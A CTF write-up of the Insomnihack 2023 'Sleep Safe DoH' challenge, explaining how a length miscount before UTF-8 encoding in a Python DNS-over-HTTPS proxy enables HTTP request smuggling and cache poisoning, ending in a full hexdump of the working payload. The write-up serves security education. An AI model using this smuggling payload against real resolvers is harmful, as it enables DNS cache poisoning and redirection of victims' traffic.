# Insomnihack 2023 CTF - Sleep Safe DoH

This CTF came to me as a surprise.  
I was on a 2-month ski vacation with my best friend and CTF partner [@urikiller](https://github.com/urikiller) when my boss sent me a link to Insomnihack.  
Usually we play with [pasten](https://ctftime.org/team/6965), but this CTF requires to be on site and no one else was on the area.  
Nevertheless, as we were only about an hour and a half drive away, we made a quick decision to pack a bag of snacks and hit the road to solve some challenges.

## Description

Unfortunately, I didn't save the original description before the website went down, but the gist is this:  
The challenge revolves around **DNS over HTTPS - DoH**. We get a website where we can
* Query any DNS name
* Send a flag to a domain assigned to us when we first visit the site (e.g. `ebd771980a2f12d1.insomnihack.flag`) - we call it the flag domain

The backend implements DoH so the DNS queries we send go through the DoH mechanism, as well as the query for the flag domain when we ask to send the flag.  
The backend uses `https://dns.google/dns-query` for the actual resolving and implements a cache (important!) for storing the responses.  

We get the python code of the backend running in the challenge - [challenge.py](https://github.com/amelkiy/write-ups/blob/master/Insomnihack-2023/SleepSafeDoH/challenge.py)

## DNS over HTTPS

First, let's go over the basics of DoH.  
The actual protocol is fairly simple - it works the same as the "normal" DNS protocol but uses an HTTPS connection as the medium.  
The queries and the responses inside the HTTP request are of the same binary format as a normal DNS query (binary data hexdump-ed):

```
POST /dns-query HTTP/1.1
Host: dns.google
Content-Type: application/dns-message
Content-Length: 28
Accept: application/dns-message

00000000: 00 00 01 00 00 01 00 00  00 00 00 00 06 67 6F 6F  .............goo
00000010: 67 6C 65 03 63 6F 6D 00  00 01 00 01              gle.com.....


HTTP/1.1 200 OK
X-Content-Type-Options: nosniff
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
Date: Sat, 25 Mar 2023 18:48:53 GMT
Expires: Sat, 25 Mar 2023 18:48:53 GMT
Cache-Control: private, max-age=300
Content-Type: application/dns-message
Server: HTTP server (unknown)
Content-Length: 44
X-XSS-Protection: 0
X-Frame-Options: SAMEORIGIN
Alt-Svc: h3=":443"; ma=2592000,h3-29=":443"; ma=2592000

00000000: 00 00 81 80 00 01 00 01  00 00 00 00 06 67 6F 6F  .............goo
00000010: 67 6C 65 03 63 6F 6D 00  00 01 00 01 C0 0C 00 01  gle.com.........
00000020: 00 01 00 00 01 2C 00 04  AC D9 A8 0E              .....,......
```

We can use `dnslib.DNSRecord.parse()` on the request and the response, and we get:
```
Request:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 0
;; flags: rd; QUERY: 1, ANSWER: 0, AUTHORITY: 0, ADDITIONAL: 0
;; QUESTION SECTION:
;google.com.                    IN      A

Response:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 0
;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 0
;; QUESTION SECTION:
;google.com.                    IN      A
;; ANSWER SECTION:
google.com.             300     IN      A       172.217.168.14
```

That's the basic protocol, not much more we need to know about it to solve the challenge.

## Finding the Bug

The [python file](https://github.com/amelkiy/write-ups/blob/master/Insomnihack-2023/SleepSafeDoH/challenge.py) we got with the challenge contains some Flask code and a DoH query-parsing routine, which is the important part of the challenge.  
Let's have a look:
```
def build_dns_query(host):
    query = "\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00"
    query += "".join(chr(len(part)) + part for part in host)
    query += "\x00\x00\x01\x00\x01"
    return query

def process_dns_query(query_bytes):
    query = DNSRecord.parse(query_bytes)

    answer = query.reply()

    s = requests.Session()
    for i, question in enumerate(query.questions[:3]): # limit to 3 questions to avoid DoS
        if question.qtype == QTYPE.A:
            fqdn = list(map(bytes.decode, question.qname.label))
            cache_key = ('.'.join(fqdn)).encode().hex()

            cached_value = redis.get(cache_key)

            if cached_value == None:
                print("Resolving", fqdn, flush=True)

                query = build_dns_query(fqdn)
                req = REQ_TEMPLATE.copy()
                req.body = query.encode()
                req.headers["Content-Length"] = str(len(query))
                res = s.send(req, timeout=2).content

                # extract and cache the answer
                try:
                    record = DNSRecord.parse(res)
                    ip = [str(rr.rdata) for rr in record.rr if rr.rtype==QTYPE.A][0]
                except:
                    # error/no answer, skip
                    continue
                redis.set(cache_key, ip, ex=60)
            else:
                print("Cache hit", fqdn, flush=True)
                ip = cached_value.decode()
            
            answer.add_answer(RR(rname=question.qname, rtype=QTYPE.A, ttl=0, rdata=A(ip)))
    
    return answer.pack()
```

A couple of things come to mind:
* The code uses DNSRecord.parse from dnslib to parse our request
  * Meaning the request has to be valid (assuming we're not looking for bugs in the library)
* The request is parsed, the DNS names are extracted from it and are used to form the forward query for `dns.google`
  * Meaning we'll have to use the actual DNS name in the request if we wanted to make Google do something for us
* The cache use is straightforward, but coupled together with `query.questions[:3]` gives us a hint
  * The server supports multiple queries in one request, so we could try to use that to poison the cache
* Another hint is that the server doesn't check that the answer to the query sent contains the same DNS label as the query
  * It only checks that the answer is an A record - `if rr.rtype==QTYPE.A`
  * Meaning that if we could make Google respond with an answer to some other domain, the server would consider it to be a valid answer
* There is a third hint - `s = requests.Session()`
  * The server uses the same HTTPS session to communicate with Google when forwarding the requests 
  * **If we could somehow make Google send back 2 responses, one after the other, we could poison the cache**

### How would that work?  
The first query contains a "question" for any domain but makes Google respond with 2 responses.  
The first response is fed to `requests` when it reads the `content` after `s.send()`.  
The 2nd response contains an answer to a domain that we control. This answer is pending on the socket.  
The 2nd question contains our flag domain as the query (`ebd771980a2f12d1.insomnihack.flag`) and the server forwards it to Google with `s.send()`, but there is an answer already waiting to be read on the socket - the 2nd answer we made Google send using the first, bogus query.  
Then, when invoking `.content`, the `requests` library will read this pending answer containing the A record for our domain and the server will regard it as the answer to the flag domain query.  
Then this answer will be stored in the cache and when we ask to send the flag, the server will read our IP from the cache and send the flag to us.  

### 2 Answers in one Request
So we have a working theory of how we could poison the cache, but we still need to make Google respond with 2 answers for one request.  
Let's look at how the request to Google is generated:
```
def build_dns_query(host):
    query = "\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00"
    query += "".join(chr(len(part)) + part for part in host)
    query += "\x00\x00\x01\x00\x01"
    return query

...

fqdn = list(map(bytes.decode, question.qname.label))
query = build_dns_query(fqdn)
req = REQ_TEMPLATE.copy()
req.body = query.encode()
req.headers["Content-Length"] = str(len(query))
```

There is something weird... The `question.qname.label` contains a list of the domain "elements" -  
The domain in the DNS protocol is stored as length-value pairs instead of the dots in the name. For example:
```
www.google.com

Will be stored as
\x03www\x06google\x03com\x00

And question.qname.label will contain
[b'www', b'google', b'com']
```

The code parses the DNS query as binary, then decodes each element in the label to feed it into a query template that is **a string**...  
Now, I still write in python 2.7 because I hate the str-bytes conversions, but this is weird - you shouldn't really have binary data in a string.  
So the query is a string, the DNS label is decoded into a string, and then the whole thing is `.encode()`-d into bytes when fed to `requests`.  
The content length is set to be the length of the query before it was `.encode()`-d:
```
req.headers["Content-Length"] = str(len(query))
```

Frankly, it stinks... We decided to experiment.  

One of the things that we tried was playing with the length of each element in the query. We discovered something interesting:  
When writing a long label (128 bytes) we need to specify the length as `\x80` but when we encode it, it becomes `b'\xc2\x80'`.  
How would that affect the DNS query? Well, it breaks it completely. Turns out you can't have such long labels and a size of 192 and above means a pointer in the packet (not really important). But it gives us something else!  
Consider having the name `foo\x80bar.com` - it would be represented as `\x07foo\x80bar\x03com\x00` but when we encode it, it becomes `b'\x07foo\xc2\x80bar\x03com\x00'`, which is 1 byte longer.  
Forget for a second that it becomes an invalid query (the \x07 would have to be changed to \x08), how does it affect the code?
```
# The query is (7+1) + (3+1) + 1 = 13 bytes (forget the headers/footers)
query = build_dns_query(fqdn)

req = REQ_TEMPLATE.copy()

# req.body becomes 14 bytes because of the encode()
req.body = query.encode()

# The content length is set to 13 bytes!
req.headers["Content-Length"] = str(len(query))
```

Now the code will send this query to Google, the first 13 bytes will be read as the payload of the HTTP request but the trailing byte will be considered an extra HTTP request!  
If we could smuggle a whole HTTP request containing a valid query to the server - we could make it respond with 2 answers and poison the cache!

## Building the Full Request

This part is a bit tricky so try to stay focused!  

The request needs to be valid and include the following:
* Bogus query that contains a number of `\x80` characters and the extra HTTP payload
  * We chose `\x80` arbitrarily as it's not a valid ASCII character, any non-ASCII character will work
  * The HTTP payload has to be inside the DNS label since it's the only data that gets passed to Google
  * There has to be an exact number of  `\x80` characters so that the encoded payload will expand to fit the content length
* A query to a domain we control

Let's start with the 2nd query since it's the easiest. We'll take `my.server.com` as an example to a domain we control.  
We can generate it using `build_dns_query(['my', 'server', 'com'])` and take the HTTP headers from the challenge code (binary data in hexdump):
```
POST /dns-query HTTP/1.1
Host: dns.google
Accept: application/dns-message
Content-Type: application/dns-message
Content-Length: 31

00000000: 00 00 01 00 00 01 00 00  00 00 00 00 02 6D 79 06  .............my.
00000010: 73 65 72 76 65 72 03 63  6F 6D 00 00 01 00 01     server.com.....
```

That will be our payload. Now we need to fit it into a DNS query inside one of the labels.  
The payload is 169 bytes long, so we need to have 169 bytes of `\x80` prior to it. 
Actually, the DNS label is going to be `decode()`-d prior to building a new request, and we need the `\x80` in the decoded version, so that when it will be encoded again, they will expand to `b'\xc2\x80'`.  
So we actually need to put 169 pairs of `b'\xc2\x80'` into the request. They will be decoded to 169 `\x80` bytes, used to build a new query and encoded again.  
The length of a single element in the DNS query has to be under 192 bytes (technically under 64, but it's usually not enforced), so we decided to split these bytes into a number of ~90 bytes chunks.  
One last thing, the DNS parser parses the packet in the encoded form, as bytes, so it will see a bunch of `b'\xc2\x80'` bytes.  
For an extra of 169 bytes we need 169 pairs of `b'\xc2\x80'`, so that's 338 bytes - 2 chunks of 180+158 bytes.  
The full request will look something like this:
```
[header - \x00\x00\x01...] [180] [b'\xc2\x80' * 90] [158] [b'\xc2\x80' * 79] [169] [payload - 169 bytes] [footer - \x00\x00...]
```
Now the server will parse this request and get a DNS label of
```
[b'\xc2\x80' * 90, b'\xc2\x80' * 79, payload]
```
The elements in the label are decoded to become `['\x80' * 90, '\x80' * 79, payload]`  
and the new query is prepared:
```
[header] [90] ['\x80' * 90] [79] ['\x80' * 79] [169] [payload] [footer]
   12     1        90        1         79        1      169       5
```

The length of this whole thing is 12+1+90+1+79+1+169+5 = 358 characters.  
When encoded, the `\x80`s are expanded, so we get an extra of 90+79=169 bytes.  
That means that the last 169 bytes are being sent as an extra query to the server.  
Ah, but we have a problem... We actually haven't considered 2 things:  
1. The footer. Since the server code is adding a footer of 5 bytes we need to include it in our calculation
   * Well, we can actually make a small trick - remove the footer from our payload and use the one provided by the code
2. The length of the payload is 169 and the character chr(169) exists in the data, so, when encoded, it will be expanded to `\xc2\xa9`
   * Not a problem, we just need to have one byte less of "padding"

Let's review - first we removed 5 bytes from the payload, so the payload is now 164 bytes. We need to remove 5 padding bytes.  
But, we also need to add 5 padding bytes to include the footer as the end of our own request. These 2 cancel each other.    
Finally, we need to remove one byte to account for the expansion of the payload length byte.  
That means we just remove one pair of `b'\xc2\x80'` bytes from the padding. That makes the 2nd chunk 158-2 = 156 bytes.    
The new payload (with the footer removed will be):
```
POST /dns-query HTTP/1.1
Host: dns.google
Accept: application/dns-message
Content-Type: application/dns-message
Content-Length: 31

00000000: 00 00 01 00 00 01 00 00  00 00 00 00 02 6D 79 06  .............my.
00000010: 73 65 72 76 65 72 03 63  6F 6D                    server.com
```
With a length of 159 bytes. The full query:  
```
[header] [180] [b'\xc2\x80' * 90] [156] [b'\xc2\x80' * 78] [164] [payload - 164 bytes] [footer]
```
The prepared query after decoding:
```
[header] [90] ['\x80' * 90] [78] ['\x80' * 78] [164] [payload] [footer]
   12     1        90        1         78        1      164       5
```
We get an extra of 90+78+1 = 169 bytes, so the last 169 bytes are being sent as an extra query - that's perfect for our 164+5=169 byte payload and footer.  

The only thing that we're missing is the query to the flag domain, so the cache is properly poisoned.  
We need to invoke it right after we send the first query to Google, so the answer to the injected HTTP request will be read as an answer to the flag domain query.  
We only need to make our request specify that we have 2 questions and append the flag domain query to the end.  
Bytes 4+5 in the header are the number of questions in the query, so all we need to do is to change them to `00 02` and append the question for the flag domain - it can be built with `build_dns_query(['ebd771980a2f12d1', 'insomnihack', 'flag'])`.  

The full payload:  
```
00000000: 00 00 01 00 00 02 00 00  00 00 00 00 B4 C2 80 C2  ................
00000010: 80 C2 80 C2 80 C2 80 C2  80 C2 80 C2 80 C2 80 C2  ................
00000020: 80 C2 80 C2 80 C2 80 C2  80 C2 80 C2 80 C2 80 C2  ................
00000030: 80 C2 80 C2 80 C2 80 C2  80 C2 80 C2 80 C2 80 C2  ................
00000040: 80 C2 80 C2 80 C2 80 C2  80 C2 80 C2 80 C2 80 C2  ................
00000050: 80 C2 80 C2 80 C2 80 C2  80 C2 80 C2 80 C2 80 C2  ................
00000060: 80 C2 80 C2 80 C2 80 C2  80 C2 80 C2 80 C2 80 C2  ................
00000070: 80 C2 80 C2 80 C2 80 C2  80 C2 80 C2 80 C2 80 C2  ................
00000080: 80 C2 80 C2 80 C2 80 C2  80 C2 80 C2 80 C2 80 C2  ................
00000090: 80 C2 80 C2 80 C2 80 C2  80 C2 80 C2 80 C2 80 C2  ................
000000A0: 80 C2 80 C2 80 C2 80 C2  80 C2 80 C2 80 C2 80 C2  ................
000000B0: 80 C2 80 C2 80 C2 80 C2  80 C2 80 C2 80 C2 80 C2  ................
000000C0: 80 9C C2 80 C2 80 C2 80  C2 80 C2 80 C2 80 C2 80  ................
000000D0: C2 80 C2 80 C2 80 C2 80  C2 80 C2 80 C2 80 C2 80  ................
000000E0: C2 80 C2 80 C2 80 C2 80  C2 80 C2 80 C2 80 C2 80  ................
000000F0: C2 80 C2 80 C2 80 C2 80  C2 80 C2 80 C2 80 C2 80  ................
00000100: C2 80 C2 80 C2 80 C2 80  C2 80 C2 80 C2 80 C2 80  ................
00000110: C2 80 C2 80 C2 80 C2 80  C2 80 C2 80 C2 80 C2 80  ................
00000120: C2 80 C2 80 C2 80 C2 80  C2 80 C2 80 C2 80 C2 80  ................
00000130: C2 80 C2 80 C2 80 C2 80  C2 80 C2 80 C2 80 C2 80  ................
00000140: C2 80 C2 80 C2 80 C2 80  C2 80 C2 80 C2 80 C2 80  ................
00000150: C2 80 C2 80 C2 80 C2 80  C2 80 C2 80 C2 80 A4 50  ...............P
00000160: 4F 53 54 20 2F 64 6E 73  2D 71 75 65 72 79 20 48  OST /dns-query H
00000170: 54 54 50 2F 31 2E 31 0D  0A 48 6F 73 74 3A 20 64  TTP/1.1..Host: d
00000180: 6E 73 2E 67 6F 6F 67 6C  65 0D 0A 41 63 63 65 70  ns.google..Accep
00000190: 74 3A 20 61 70 70 6C 69  63 61 74 69 6F 6E 2F 64  t: application/d
000001A0: 6E 73 2D 6D 65 73 73 61  67 65 0D 0A 43 6F 6E 74  ns-message..Cont
000001B0: 65 6E 74 2D 54 79 70 65  3A 20 61 70 70 6C 69 63  ent-Type: applic
000001C0: 61 74 69 6F 6E 2F 64 6E  73 2D 6D 65 73 73 61 67  ation/dns-messag
000001D0: 65 0D 0A 43 6F 6E 74 65  6E 74 2D 4C 65 6E 67 74  e..Content-Lengt
000001E0: 68 3A 20 33 31 0D 0A 0D  0A 00 00 01 00 00 01 00  h: 31...........
000001F0: 00 00 00 00 00 02 6D 79  06 73 65 72 76 65 72 03  ......my.server.
00000200: 63 6F 6D 00 00 01 00 01  10 65 62 64 37 37 31 39  com......ebd7719
00000210: 38 30 61 32 66 31 32 64  31 0B 69 6E 73 6F 6D 6E  80a2f12d1.insomn
00000220: 69 68 61 63 6B 04 66 6C  61 67 00 00 01 00 01     ihack.flag.....
```

## Conclusion

For an unknown reason, it doesn't always work... We experimented with raw SSL sockets and made sure everything works with Google, but, sometimes, the server just won't receive the 2nd answer. We think it has something to do with the way requests handles sessions, we didn't get much into it because we ran it a few times, and it worked.  
All in all, this challenge was super fun and really highlights the importance of working correctly with binary buffers and data validation.  
So, remember to always make sure your responses match your requests, and, just a friendly reminder to all you C people -  
Always initialize your variables 😁
